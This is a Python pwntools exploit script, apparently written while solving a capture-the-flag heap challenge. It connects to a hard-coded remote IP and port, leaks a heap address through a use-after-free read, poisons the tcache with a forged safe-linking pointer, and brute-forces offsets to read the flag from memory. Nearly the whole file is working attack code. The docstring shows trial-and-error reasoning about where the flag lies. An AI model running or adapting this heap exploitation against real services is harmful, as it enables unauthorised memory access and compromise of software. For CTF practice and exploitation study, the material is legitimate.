#!/usr/bin/env python3
"""
Try with the observed offset between spells
The offset between X and spell2 is large (0x2f0000 or similar)
This suggests the heap has large gaps - maybe g_flag is at a different location

Let me try: g_flag = X + offset_observed (i.e., the same gap but in the other direction)
Or g_flag = X - offset_observed

Actually, let me try a different approach:
The tcache poisoning works when targeting X.
The data at X after poisoning shows the original tcache metadata, not the flag.
So the flag is NOT at X.

Let me try: g_flag might be at spell2's address (X + 0x2f0000 or similar)
"""
from pwn import *
import sys

context.log_level = 'warning'

def try_exploit(target_offset_from_X):
    try:
        p = remote('52.76.96.108', 9005, timeout=5)
        p.recvuntil(b'> ')

        # Setup
        p.sendline(b'1'); p.recvuntil(b'index: '); p.sendline(b'0')
        p.recvuntil(b'size: '); p.sendline(b'128')
        p.recvuntil(b'data: '); p.send(b'A'*16 + b'\n')

        p.sendline(b'3'); p.recvuntil(b'index: '); p.sendline(b'0')

        p.sendline(b'4'); p.recvuntil(b'index: '); p.sendline(b'0')
        p.recvuntil(b'data: ')
        data = p.recv(128); p.recv(1)
        fd0 = u64(data[0:8])
        X = fd0 << 12

        p.sendline(b'1'); p.recvuntil(b'index: '); p.sendline(b'1')
        p.recvuntil(b'size: '); p.sendline(b'128')
        p.recvuntil(b'data: '); p.send(b'B'*16 + b'\n')

        p.sendline(b'1'); p.recvuntil(b'index: '); p.sendline(b'2')
        p.recvuntil(b'size: '); p.sendline(b'128')
        p.recvuntil(b'data: '); p.send(b'C'*16 + b'\n')

        p.sendline(b'3'); p.recvuntil(b'index: '); p.sendline(b'1')
        p.sendline(b'3'); p.recvuntil(b'index: '); p.sendline(b'2')

        p.sendline(b'4'); p.recvuntil(b'index: '); p.sendline(b'2')
        p.recvuntil(b'data: ')
        data = p.recv(128); p.recv(1)
        fd2 = u64(data[0:8])

        spell2_shifted = fd2 ^ X
        target = X + target_offset_from_X
        protected = spell2_shifted ^ target

        p.sendline(b'2'); p.recvuntil(b'index: '); p.sendline(b'2')
        p.recvuntil(b'data: ')
        p.send(p64(protected) + b'\x00' * 120)

        p.sendline(b'1'); p.recvuntil(b'index: '); p.sendline(b'3')
        p.recvuntil(b'size: '); p.sendline(b'128')
        p.recvuntil(b'data: '); p.send(b'D'*16 + b'\n')

        p.sendline(b'1'); p.recvuntil(b'index: '); p.sendline(b'4')
        p.recvuntil(b'size: '); p.sendline(b'128')
        p.recvuntil(b'data: '); p.send(b'\n')

        p.sendline(b'4'); p.recvuntil(b'index: '); p.sendline(b'4')
        p.recvuntil(b'data: ')
        data = p.recv(128); p.recv(1)

        p.close()
        return data
    except:
        try: p.close()
        except: pass
        return None

# Try many offsets
# The observed offset between X and spell2 varies (-0x130000, -0x2f0000, etc.)
# Let me try positive offsets from 0x90 to 0x200000
offsets = []
for i in range(1, 0x100):
    offsets.append(i * 0x1000)  # 0x1000 to 0x100000 in steps of 0x1000

for off in offsets[:30]:  # Just try first 30
    data = try_exploit(off)
    if data is None:
        sys.stdout.write(f"+{hex(off)}: CRASH ")
        continue
    non_zero = sum(1 for b in data if b != 0)
    has_flag = b'flag' in data.lower() or b'CTF' in data or b'{' in data
    sys.stdout.write(f"+{hex(off)}: nz={non_zero} ")
    if has_flag:
        print(f"\n[+] FLAG FOUND at offset +{hex(off)}!")
        print(f"    data: {data}")
        import re
        for m in re.finditer(rb'[\x20-\x7e]{4,}', data):
            print(f"    string: {m.group()}")
        sys.exit(0)
    sys.stdout.flush()

print("\n[-] No flag found in positive offsets")
